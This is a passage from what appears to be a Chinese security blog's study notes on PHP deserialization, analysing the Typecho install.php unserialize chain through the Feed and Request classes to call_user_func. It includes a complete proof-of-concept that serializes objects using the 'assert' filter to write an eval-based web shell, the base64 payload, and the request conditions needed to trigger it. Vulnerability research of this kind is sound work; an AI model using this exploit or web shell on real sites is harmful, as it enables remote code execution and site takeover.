    <span class="token comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_pool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_connectedPool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$adapterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>æŸ¥æ‰¾<font color=purple><code>__toString()</code></font>é­”æœ¯æ–¹æ³•ï¼Œå‘ç°åœ¨<font color=orange><code>\var\Typecho\Feed.php</code></font>ä¸­ï¼šè‹¥<font color=orange><code>$item[&#39;author&#39;]</code></font>ä¸­ä¸å­˜åœ¨<font color=orange><code>screenName</code></font>å±æ€§ï¼Œåˆ™ä¼šè§¦å‘itemçš„<font color=purple><code>__get()</code></font>é­”æœ¯æ–¹æ³•</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;item>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;title>'</span> <span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/title>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;link>'</span> <span class="token punctuation">.</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/link>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;guid>'</span> <span class="token punctuation">.</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/guid>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;pubDate>'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/pubDate>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;dc:creator>'</span> <span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'author'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">screenName</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/dc:creator>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>å…¨å±€æœç´¢é­”æœ¯æ–¹æ³•<font color=purple><code>__get()</code></font>åï¼Œåœ¨<font color=orange><code>\var\Typecho\Request.php</code></font>ä¸­æ‰¾åˆ°è¯¥æ–¹æ³•ï¼šåœ¨è¯¥æ–¹æ³•ä¸­è°ƒç”¨äº†<font color=orange><code>get()</code></font>æ–¹æ³•ï¼Œå…¶ä¸­ç»™ä¼ å…¥çš„ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼å¹¶è°ƒç”¨<font color=orange><code>_applyFilter()</code></font>æ–¹æ³•</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token keyword">isset</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_httpParams</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_httpParams</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$value</span> <span class="token punctuation">:</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_applyFilter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>åœ¨<font color=orange><code>_applyFilter()</code></font>ä¸­ï¼Œå°†æ ¹æ®<font color=orange><code>$value</code></font>æ˜¯å¦ä¸ºæ•°ç»„æ¥è°ƒç”¨<font color=orange><code>array_map()</code></font>æˆ–<font color=orange><code>call_user_func()</code></font>å‡½æ•°ï¼Œè€Œè¿™ä¸¤ä¸ªå‡½æ•°ä¾¿å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_applyFilter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="3-3-å¤ç°æµç¨‹"><a href="#3-3-å¤ç°æµç¨‹" class="headerlink" title="3.3 å¤ç°æµç¨‹"></a>3.3 å¤ç°æµç¨‹</h4><p>ç»è¿‡ä¸Šæ–‡çš„åˆ†æï¼Œæ•´ä¸ªæµç¨‹ä¹Ÿå°±æ¸…æ™°äº†ï¼š</p>
<ol>
<li>æ„é€ payloadç»•è¿‡å¹¶æ‰§è¡Œååºåˆ—åŒ–ï¼ˆéœ€è¦base64ç¼–ç ï¼‰</li>
<li>payloadéœ€é€šè¿‡cookieæˆ–POSTæ–¹å¼ä¼ å…¥</li>
<li>payloadä¸­çš„<font color=orange><code>Config</code></font>å±æ€§ä¼ å…¥<font color=orange><code>Typecho_Db</code></font>ä¸­ï¼Œ<font color=orange><code>Typecho_Db</code></font>ä¼šè§¦å‘<font color=purple><code>__toString()</code></font>é­”æœ¯æ–¹æ³•</li>
<li>åœ¨<font color=purple><code>__toString()</code></font>é­”æœ¯æ–¹æ³•ä¸­å†è§¦å‘<font color=purple><code>__get()</code></font>é­”æœ¯æ–¹æ³•</li>
<li>æœ€ååˆ©ç”¨<font color=purple><code>__get()</code></font>é­”æœ¯æ–¹æ³•ä¸­çš„å‡½æ•°è°ƒç”¨<font color=orange><code>array_map()</code></font>æˆ–<font color=orange><code>call_user_func()</code></font>å‡½æ•°ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ</li>
</ol>
<h4 id="3-4-payloadæ„é€ ï¼ˆå‚è€ƒ-5-ï¼‰"><a href="#3-4-payloadæ„é€ ï¼ˆå‚è€ƒ-5-ï¼‰" class="headerlink" title="3.4 payloadæ„é€ ï¼ˆå‚è€ƒ[5]ï¼‰"></a>3.4 payloadæ„é€ ï¼ˆå‚è€ƒ[5]ï¼‰</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ATOM 1.0'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_items</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'screenName'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'file_put_contents(\'shell.php\', \'&lt;?php @eval($_GET["shell"]);?>\')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$payload1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$payload2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$payload1</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'typecho_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjQ6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9HRVRbInNoZWxsIl0pOz8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
?></code></pre>

<p>æ„é€ å¹¶å‘é€æ•°æ®åŒ…ï¼Œæ³¨æ„è¦æ»¡è¶³<font color=orange><code>install.php</code></font>çš„è¦æ±‚ï¼šæœ‰<font color=orange><code>finish</code></font>å‚æ•°å’Œ<font color=orange><code>HTTP_REFERER</code></font></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ¤æ–­æ˜¯å¦å·²ç»å®‰è£…</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'finish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">__TYPECHO_ROOT_DIR__</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/config.inc.php'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'typecho'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$parts</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_HOST'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>æ„é€ è¯·æ±‚å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201511.png" alt="image-20210430201358165" loading="lazy"></p>
<p>shellä¸Šä¼ æˆåŠŸï¼š</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201504.png" alt="image-20210430201431734" loading="lazy"></p>
<h3 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h3><p>[1] [çº¢æ—¥å®‰å…¨]Webå®‰å…¨Day15 - ååºåˆ—åŒ–å®æˆ˜æ”»é˜² <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7023">https://xz.aliyun.com/t/7023</a></p>
<p>[2] PHP é­”æœ¯æ–¹æ³• - ç®€ä»‹ <a target="_blank" rel="noopener" href="https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-index.html">https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-index.html</a></p>
<p>[3] [BUUCTF-WEB] [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz <a target="_blank" rel="noopener" href="https://juejin.cn/post/6929123441257742350">https://juejin.cn/post/6929123441257742350</a></p>
<p>[4] AreUSerialz-[ç½‘é¼æ¯ 2020 é’é¾™ç»„]-[ä¼ é€é—¨-ï¼BUUCTF] <a target="_blank" rel="noopener" href="https://www.secn.net/article/349246.html">https://www.secn.net/article/349246.html</a></p>
<p>[5] Typechoååºåˆ—åŒ–æ¼æ´åˆ†æ <a target="_blank" rel="noopener" href="https://lanvnal.com/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/">https://lanvnal.com/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/</a></p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>Echoram</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®°">http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/12/23/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%A6%E8%A7%A3/" rel="next" title="æ³¨å†Œè¡¨è¯¦è§£"><span class="post-nav-text">æ³¨å†Œè¡¨è¯¦è§£</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>è‹¥æ‚¨æƒ³åŠæ—¶å¾—åˆ°å›å¤æé†’ï¼Œå»ºè®®ä½¿ç”¨é‚®ç®±è”ç³»åšä¸»å‘¦~</span><br></div><div id="valine-container"></div><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function initValine() {
  const valineConfig = {"enable":true,"appId":"tgTIs6toa7rmkMnrsSTHEg1p-MdYXbMMI","appKey":"mA678OPlrWqFxom64uRzNBXL","placeholder":"è¯·å†™ä¸‹ä½ å®è´µçš„è¯„è®º~","avatar":"monsterid","pageSize":10,"visitor":true,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"lang":"zh-cn","Emoji See":"https://valine.js.org/emoji.html","el":"#valine-container"}
  valineConfig.path = window.location.pathname
  new Valine(valineConfig)
}
setTimeout(initValine, 800)</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 â€“ 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Echoram</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.2.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>æœ¬åšå®¢å·²ç¨³å¥è¿è¡Œ</span><span id="display_live_time"></span><span class="moe-text">(~_~)</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-12-10T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="æƒ³è¦æœäº›ä»€ä¹ˆï¼Ÿ" value=""></div><div id="local-search-result"></div></div></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>